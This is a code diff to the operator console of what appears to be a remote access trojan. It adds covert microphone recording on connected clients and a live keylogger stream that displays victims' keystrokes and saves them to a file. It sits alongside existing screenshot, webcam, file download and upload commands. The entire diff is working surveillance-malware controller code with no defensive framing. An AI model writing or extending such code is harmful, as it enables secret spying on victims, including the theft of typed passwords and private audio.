@@ -44,10 +44,18 @@ def execute_command(cmd, cmd_name):
         start_time = time.time()
         last_update = time.time()
 
-        is_special_cmd = cmd.upper().startswith(("SCREENSHOT", "DOWNLOAD:", "UPLOAD:", "SYSINFO", "POPUP:", "WEBCAM"))
-        max_timeout = 15.0 if cmd.upper() in ("SCREENSHOT", "WEBCAM") else 5.0
-        if cmd.upper() in ("SCREENSHOT", "WEBCAM"):
-            max_chunks = 500
+        is_special_cmd = cmd.upper().startswith(("SCREENSHOT", "DOWNLOAD:", "UPLOAD:", "SYSINFO", "POPUP:", "WEBCAM", "MICROPHONE"))
+        if cmd.upper().startswith("MICROPHONE"):
+            try:
+                mic_duration = int(cmd.split(":")[1])
+            except (IndexError, ValueError):
+                mic_duration = 10
+            max_timeout = max(30.0, float(mic_duration) + 15.0)
+            max_chunks = 2000
+        else:
+            max_timeout = 15.0 if cmd.upper() in ("SCREENSHOT", "WEBCAM") else 5.0
+            if cmd.upper() in ("SCREENSHOT", "WEBCAM"):
+                max_chunks = 500
 
         while chunk_count < max_chunks:
             try:
@@ -163,6 +171,13 @@ def _handle_special_response(output):
                 g.root.after(0, lambda m=response.get('message'): g.terminal_output.insert(tk.END, f"✓ {m}\n", "success"))
             else:
                 g.root.after(0, lambda m=response.get('message'): g.terminal_output.insert(tk.END, f"❌ Popup failed: {m}\n", "error"))
+
+        elif resp_type == "MICROPHONE":
+            if response.get("status") == "success":
+                g.root.after(0, lambda: feat.save_audio_file(response.get("data"), response.get("duration", 10), response.get("sample_rate", 44100)))
+                g.root.after(0, lambda d=response.get('duration', 10): g.terminal_output.insert(tk.END, f"✓ Audio recorded ({d}s)\n", "success"))
+            else:
+                g.root.after(0, lambda m=response.get('message'): g.terminal_output.insert(tk.END, f"❌ Microphone failed: {m}\n", "error"))
 
     except json.JSONDecodeError:
         if output.strip():
@@ -319,3 +334,123 @@ def prompt_process_operation(cmd_prefix, operation_name):
     tk.Button(btn_frame, text="✓ Execute", command=execute, font=("Segoe UI", 11, "bold"), bg="#4CAF50", fg="white", relief="flat", padx=30, pady=10, cursor="hand2").pack(side="left", padx=8)
     tk.Button(btn_frame, text="✗ Cancel", command=dialog.destroy, font=("Segoe UI", 11), bg="#757575", fg="white", relief="flat", padx=30, pady=10, cursor="hand2").pack(side="left", padx=8)
     entry.bind("<Return>", lambda e: execute())
+
+
+# ── Keylog Live-Stream ─────────────────────────────────────────────────────────
+
+_keylog_stream_active = False
+_keylog_buffer = []
+
+def start_keylog_stream():
+    """
+    Send KEYLOG_START to client, then loop reading [KEYSTROKE] lines
+    and displaying them in the GUI terminal in real time.
+    Runs in a daemon thread.
+    """
+    global _keylog_stream_active, _keylog_buffer
+    _keylog_stream_active = True
+    _keylog_buffer = []
+
+    conn = None
+    try:
+        with g.clients_lock:
+            if not g.active_client_id or g.active_client_id not in g.clients:
+                g.root.after(0, lambda: g.terminal_output.insert(tk.END, "\n❌ No active client\n", "error"))
+                _cleanup_keylog()
+                return
+            conn = g.clients[g.active_client_id]["conn"]
+
+        conn.send(b"KEYLOG_START")
+        conn.settimeout(0.3)
+
+        buf = ""
+        while _keylog_stream_active:
+            try:
+                chunk = conn.recv(4096).decode(errors="replace")
+                if not chunk:
+                    break
+                buf += chunk
+                while "\n" in buf:
+                    line, buf = buf.split("\n", 1)
+                    line = line.strip()
+                    if line == "[KEYLOG_END]":
+                        _keylog_stream_active = False
+                        break
+                    if line.startswith("[KEYSTROKE]"):
+                        ts_key = line[len("[KEYSTROKE]"):].strip()
+                        _keylog_buffer.append(ts_key)
+                        g.root.after(0, lambda k=ts_key: g.terminal_output.insert(tk.END, f"  ⌨️ {k}\n", "keylog"))
+                        g.root.after(0, lambda: g.terminal_output.see(tk.END))
+            except socket.timeout:
+                continue
+            except (OSError, ConnectionError):
+                break
+
+    except Exception as e:
+        g.root.after(0, lambda m=str(e): g.terminal_output.insert(tk.END, f"\n❌ Keylog stream error: {m}\n", "error"))
+    finally:
+        _cleanup_keylog()
+
+
+def stop_keylog():
+    """Send KEYLOG_STOP to client to end the live stream."""
+    global _keylog_stream_active
+    _keylog_stream_active = False
+    try:
+        with g.clients_lock:
+            if g.active_client_id and g.active_client_id in g.clients:
+                conn = g.clients[g.active_client_id]["conn"]
+                try:
+                    conn.send(b"KEYLOG_STOP")
+                except Exception:
+                    pass
+    except Exception:
+        pass
+    _cleanup_keylog()
+
+
+def _cleanup_keylog():
+    """Restore keylog button, prompt save dialog, restore prompt."""
+    global _keylog_stream_active, _keylog_buffer
+    _keylog_stream_active = False
+    if g.keylog_active:
+        g.keylog_active = False
+        btn = g.keylog_button
+        if btn:
+            g.root.after(0, lambda: btn.config(text="⌨️ Keylog", bg="#FF6F00"))
+
+        if _keylog_buffer:
+            keys_copy = list(_keylog_buffer)
+            g.root.after(0, lambda buf=keys_copy: _prompt_save_keylog(buf))
+
+        _keylog_buffer = []
+        g.root.after(0, lambda: g.terminal_output.insert(tk.END, "⌨️ Keylog stream ended\n", "success"))
+        g.root.after(0, lambda: g.terminal_output.insert(tk.END, "Remote-Admin> ", "prompt"))
+        g.root.after(0, lambda: g.terminal_output.mark_set("input_start", "end-1c"))
+
+
+def _prompt_save_keylog(keys):
+    """Ask user if they want to save the captured keystrokes — runs on main thread."""
+    if not keys:
+        return
+    from tkinter import messagebox, filedialog
+    ask = messagebox.askyesno("⌨️ Keylog Complete", f"{len(keys)} keys captured.\n\nSave keystrokes to file?")
+    if not ask:
+        return
+    from datetime import datetime
+    fn = filedialog.asksaveasfilename(
+        defaultextension=".txt",
+        filetypes=[("Text", "*.txt"), ("All", "*.*")],
+        initialfile=f"keylog_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
+    )
+    if fn:
+        try:
+            with open(fn, "w", encoding="utf-8") as f:
+                f.write(f"Keylog Capture\n")
+                f.write(f"Keys: {len(keys)}\n")
+                f.write(f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
+                f.write("="*50 + "\n\n")
+                f.write("\n".join(keys))
+            g.terminal_output.insert(tk.END, f"✓ Keylog saved: {fn} ({len(keys)} keys)\n", "success")
+        except Exception as e:
+            g.terminal_output.insert(tk.END, f"❌ Save failed: {e}\n", "error")
